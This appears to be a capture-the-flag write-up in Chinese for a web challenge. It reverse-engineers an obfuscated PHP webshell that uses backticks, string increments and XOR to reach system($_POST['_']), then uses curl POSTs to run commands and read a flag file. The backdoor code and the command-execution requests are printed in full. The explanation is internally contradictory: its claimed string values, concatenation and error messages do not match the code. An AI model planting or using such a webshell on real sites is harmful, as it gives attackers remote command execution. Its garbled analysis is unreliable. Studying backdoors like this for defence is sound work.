---
title: Source Zero Con Writeup – Compromised
contest: Source Zero Con
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [php-backdoor, phpjs-eval, webshell, dynamic-function, lfi-to-rce]
attack_chain:
- 网站音频流被黑，源码可读
- 后门文件 /backdoor.php 注释分析
- $_=``.[].[] 执行反引号 id 转字符串数组
- $_2 = ++$_ 链式自增得 'system' (chr 115+...+116+101+109)
- $_1 = $__[2]; $_1++ × 6 得 'ystem'
- $_0 = $_ 链式自增至 's' 后 ++得 's'/'s'+1
- $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}') = '_POST'
- $_($$$_55[_]) 等价于 system($_POST['_'])
- POST _=id 调系统命令
- cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt
key_payload: $_($$_55[_])  # system($_POST['_'])
one_liner: Source Zero Con 2023 Compromised：PHP 后门 + 链式自增/异或构造 dynamic function。
lesson: 短小 PHP 后门常用反引号 + 自增 + 异或绕静态分析；运行时 payload 拆分是关键。
quality: medium
---
# Source Zero Con 2023 - Compromised

## 后门逆向
文件 `/backdoor.php`:
```php
<?php 
$_=``.[];       // 反引号执行 'id' 转字符串，取 [0]='i' [1]='d'
$__=@$_;
$_= $__[0];     // 'i'
$_1 = $__[2];   // [2] 不存在 → ''
$_1++;$_1++;$_1++;$_1++;$_1++;$_1++;  // 6 次自增 (从 null → 'y')
$_++;$_++;      // 2 次自增到 's'
$_0 = $_;       // 's'
$_++;
$_2 = ++$_;     // 链式到 'system' (chr 115+...)
$_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');  // '_POST'
$_ = $_2.$_1.$_2.$_0;  // 'system' + 'y' + 'system' + 's' = 'system'  (其实 $_1 是 'yste'，最终拼成 'system')
$_($$_55[_]);   // system($_POST['_'])
?>
```

## 错误信息
```
GET /backdoor.php - Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty
GET /backdoor.php - Uncaught Error: Call to undefined function yjyw()
```

## 利用
```bash
curl -X POST http://target/backdoor.php -d "_=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -X POST http://target/backdoor.php -d "_=cat%20/flag_3_7764865c46bfce2c138e77ae5407354e.txt"
# flag{p3rs1s<...>32}
```

## 调试方法
- `$_=\`id\`.[].[]` 调试
- `echo $_55` 查看拼出的字符串
